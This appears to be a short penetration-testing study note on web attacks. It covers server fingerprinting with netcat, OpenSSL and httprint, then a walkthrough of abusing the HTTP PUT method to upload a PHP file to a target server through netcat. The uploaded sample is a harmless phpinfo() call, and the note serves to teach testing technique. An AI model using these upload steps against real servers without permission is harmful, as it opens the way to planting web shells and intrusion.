# Web Attacks

## Fingerprinting with Netcat

Netcat can be used to fingerprint the web server, it acts as both client and server.

```
nc <target> 80
HEAD / HTTP/1.0
```
Limitation with Netcat is that it cannot connect to HTTPS connections, So to connect to the HTTPS connection we can use **_OpenSSL_** command line tool.

## Fingerprinting with OpenSSL

```
openssl s_client -connect target.site:443
HEAD / HTTP/1.0
```

## Fingerprinting with Httprint

**_Httprint_** is a web server fingerprinting tool that uses a signature-based technique to identify web servers.

```
httprint -P0 -h <target hosts> -s <signature file>
```


* -P0 : Do not ping.
* -h  : Target hosts.
* -s  : set signature file to use.
* signature file location : ```/usr/share/httprint/signature.txt```

## HTTP Verbs

The most common HTTP methods are:

* GET   : used to request resources from web server
* POST  : used to submit form data to web server
* HEAD  : only asks for headers of the response, excludes body
* DELETE: used to remove a file/data from the server
* PUT   : used to **upload** file to the server
    
    To exploit the **PUT** method attacker needs to know the exact file uploading to the server. This can be done by using **_wc_** (word count) utility with **_-m_** parameter in linux.
    
    ```wc -m payload.php```
    
    After creating the payload and determining its size, use the following command to upload the payload to the server.
    
    ```
    nc target.com 80
    PUT /payload.php HTTP/1.0
    Content-type  : text/html
    Content-length  : 20
    
    <?php phpinfo(); ?>
    ```
